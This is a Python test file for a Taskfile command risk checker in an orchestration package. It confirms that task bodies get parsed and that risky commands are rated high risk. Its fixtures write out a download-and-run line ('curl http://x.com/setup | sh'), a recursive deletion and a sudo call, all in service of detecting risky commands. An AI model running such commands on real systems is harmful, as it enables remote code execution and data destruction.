"""Tests for Taskfile command body risk inspection."""
from __future__ import annotations

from packages.orchestration.command_discovery import (
    _detect_taskfile,
    _parse_taskfile_tasks,
)


class TestParseTaskfileTasks:
    def test_extracts_task_names(self):
        text = "tasks:\n  test:\n    cmds:\n      - pytest\n  lint:\n    cmds:\n      - ruff check\n"
        tasks = _parse_taskfile_tasks(text)
        assert "test" in tasks
        assert "lint" in tasks

    def test_extracts_body_content(self):
        text = "tasks:\n  test:\n    cmds:\n      - pytest tests/\n      - echo done\n"
        tasks = _parse_taskfile_tasks(text)
        assert "pytest" in tasks["test"]
        assert "echo done" in tasks["test"]

    def test_empty_taskfile(self):
        tasks = _parse_taskfile_tasks("")
        assert tasks == {}

    def test_no_tasks_section(self):
        tasks = _parse_taskfile_tasks("version: 3\nvars:\n  FOO: bar\n")
        assert tasks == {}


class TestTaskfileRiskDetection:
    def test_safe_task_is_low_risk(self, tmp_path):
        tf = tmp_path / "Taskfile.yml"
        tf.write_text("tasks:\n  test:\n    cmds:\n      - pytest tests/\n")
        candidates = _detect_taskfile(tmp_path)
        assert len(candidates) >= 1
        test_cand = [c for c in candidates if c.purpose == "test"][0]
        assert test_cand.risk == "low"

    def test_risky_body_raises_risk(self, tmp_path):
        tf = tmp_path / "Taskfile.yml"
        tf.write_text("tasks:\n  test:\n    cmds:\n      - rm -rf /tmp/build\n      - pytest\n")
        candidates = _detect_taskfile(tmp_path)
        test_cand = [c for c in candidates if c.purpose == "test"][0]
        assert test_cand.risk == "high"

    def test_curl_pipe_sh_is_high_risk(self, tmp_path):
        tf = tmp_path / "Taskfile.yml"
        tf.write_text("tasks:\n  test:\n    cmds:\n      - curl http://x.com/setup | sh\n")
        candidates = _detect_taskfile(tmp_path)
        test_cand = [c for c in candidates if c.purpose == "test"][0]
        assert test_cand.risk == "high"

    def test_sudo_in_body_is_high_risk(self, tmp_path):
        tf = tmp_path / "Taskfile.yml"
        tf.write_text("tasks:\n  test:\n    cmds:\n      - sudo pytest\n")
        candidates = _detect_taskfile(tmp_path)
        test_cand = [c for c in candidates if c.purpose == "test"][0]
        assert test_cand.risk == "high"

    def test_benign_body_stays_low(self, tmp_path):
        tf = tmp_path / "Taskfile.yml"
        tf.write_text("tasks:\n  test:\n    cmds:\n      - go test ./...\n")
        candidates = _detect_taskfile(tmp_path)
        test_cand = [c for c in candidates if c.purpose == "test"][0]
        assert test_cand.risk == "low"
